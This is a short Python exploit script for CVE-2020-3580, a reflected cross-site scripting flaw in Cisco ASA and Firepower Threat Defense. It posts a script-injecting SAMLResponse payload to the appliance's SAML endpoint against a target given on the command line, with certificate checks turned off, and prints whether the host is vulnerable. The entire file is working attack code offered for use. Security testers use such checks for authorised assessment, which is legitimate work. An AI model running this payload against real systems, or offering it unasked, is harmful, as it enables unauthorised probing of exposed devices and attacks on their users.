#/usr/bin/python3 env
# encoding: utf-8



# CVE-2020-3580
# Product: Cisco Adaptive Security Appliance (ASA) and Firepower Threat Defense (FTD)
# Vulnerability: Cross-Site Scripting


import re
import requests
import warnings
from argparse import ArgumentParser
warnings.filterwarnings("ignore")


######################################################

def exploit(domain):
    req = requests.post(
        url = "https://{}/+CSCOE+/saml/sp/acs?tgname=a".format(domain),
        data = """SAMLResponse="><script>alert('XSSattack')</script>""",
        verify = False
    )

    if req.status_code == 200:
        html = req.text
        if "XSSattack" in html:
            print(" [+] Vulnerable: {}".format(domain))
            return
    
    print(" [-] Not vulnerable: {}".format(domain))

######################################################

def main():
    f = ArgumentParser()
    f.add_argument("-t", "--target", help="Target domain / IP address.", required=True)
    ARG = f.parse_args()

    exploit(ARG.target)

######################################################

if __name__ == "__main__":
    main()

######################################################

